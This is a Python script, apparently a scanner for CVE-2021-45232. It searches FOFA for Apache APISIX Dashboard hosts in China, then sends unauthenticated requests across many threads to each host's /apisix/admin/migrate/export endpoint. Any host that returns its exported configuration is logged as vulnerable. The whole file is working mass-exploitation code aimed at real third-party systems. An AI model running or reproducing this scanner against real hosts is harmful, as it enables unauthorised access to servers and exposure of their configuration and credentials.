import requests
import threading
import time
import queue
import base64
import re
from lxml import etree
import sys

fofa='title="Apache APISIX Dashboard" && country="CN"'
fofa=fofa.encode("utf-8")
fofa_finall=base64.b64encode(fofa)
fofa_test=fofa_finall.decode("utf-8")
headers = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36",
    "cookie":"fofa_token="


}
def banber():
    logo='''
===========================================================================  
  ______     _______     ____   ___ ____  _       _  _  ____ ____  _________  
 / ___\ \   / / ____|   |___ \ / _ \___ \/ |     | || || ___|___ \|___ /___ \ 
| |    \ \ / /|  _| _____ __) | | | |__) | |_____| || ||___ \ __) | |_ \ __) |
| |___  \ V / | |__|_____/ __/| |_| / __/| |_____|__   _|__) / __/ ___) / __/ 
 \____|  \_/  |_____|   |_____|\___/_____|_|        |_||____/_____|____/_____|
===========================================================================  

    '''
    return logo
logo = banber()
print(logo)
lock=threading.RLock()
def fofa_check():
    lock.acquire()
    while not q.empty():
        page=q.get()
        try:
            url = 'https://fofa.so/result?page=' + str(page) + '&qbase64=' + fofa_test
            r = requests.get(url=url, headers=headers)
            r1 = r.content
            soup = etree.HTML(r1.decode('utf-8'))
            result = soup.xpath('//span[@class="aSpan"]/a[@target="_blank"]/@href')
            results = '\n'.join(result)
            results = results.split()
            for urls in results:
                try:
                    APISIX(urls)
                    time.sleep(1)
                except Exception as w:
                    pass
            lock.release()
        except Exception as s:
            time.sleep(1)
            pass
def APISIX(urls):
    heard1={
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36"
        }
    urlss=urls+"/apisix/admin/migrate/export"
    try:
        t=requests.get(url=urlss,headers=heard1)
        if ('{"Consumers":[]' in t.text):
            print(urls+"存在漏洞\n")
            with open(r'resualt.txt','a+',encoding='utf-8') as f:
                if urls.split(":")[1] not in "resualt.txt":
                    f.write('url----------'+urls+'---------存在漏洞！！\n')
                    f.close()
                else:
                    pass
        else:
            print(urls+"不存在漏洞\n")
    except:
        print(urls+"利用失败\n")


if __name__ == '__main__':
        pages = sys.argv[1]
        numbers = sys.argv[2]
        q = queue.Queue()
        for x in range(1, int(pages) + 1):
            q.put(x)
        for y in range(1,int(numbers) + 1):
            t = threading.Thread(target=fofa_check)
            t.start()

